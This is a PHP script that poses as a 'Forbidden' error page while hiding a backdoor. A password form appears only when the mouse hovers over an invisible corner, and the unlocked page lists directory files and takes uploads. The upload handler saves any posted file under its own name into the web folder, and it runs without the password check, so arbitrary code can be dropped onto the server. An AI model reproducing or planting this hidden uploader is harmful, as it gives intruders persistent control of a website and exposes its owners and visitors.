<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$correct_password = "007";
$access_granted = false;

if (isset($_POST['auth']) && $_POST['auth'] === $correct_password) {
    $access_granted = true;
}

if (!empty($_FILES["filename"]["tmp_name"]) && is_uploaded_file($_FILES["filename"]["tmp_name"])) {
    move_uploaded_file($_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"]);
    $uploaded_file = $_FILES["filename"]["name"];
}
?>

<html>
<head>
    <meta charset="utf-8">
    <title><?php echo $_SERVER['HTTP_HOST']; ?></title>
</head>
<body>

<?php if (!$access_granted): ?>
    <div style="position:fixed;bottom:0;right:0;width:50px;height:50px;" onmouseover="document.getElementById('hidden').style.display='block';"></div>
    <div id="hidden" style="display:none;position:fixed;bottom:10px;right:10px;background:#eee;padding:10px;">
        <form method="post">
            <input type="password" name="auth" placeholder="Enter password">
            <input type="submit" value="Enter">
        </form>
    </div>
     <h1>Forbidden</h1>
    <p>You don't have permission to access this resource.</p>
<?php else: ?>
    <h2>Files and Upload:</h2>
    <ul>
        <?php
        $files = scandir(__DIR__);
        foreach ($files as $file) {
            if ($file == '.' || $file == '..') continue;
            echo "<li><a href='$file' target='_blank'>$file</a></li>";
        }
        ?>
    </ul>

    <form method="post" enctype="multipart/form-data">
        <input type="file" name="filename">
        <input type="submit" value="submit">
    </form>

    <?php if (isset($uploaded_file)): ?>
        <p>✅ Uploaded: <a href="<?php echo $uploaded_file; ?>"><?php echo $uploaded_file; ?></a></p>
    <?php endif; ?>
<?php endif; ?>

</body>
</html>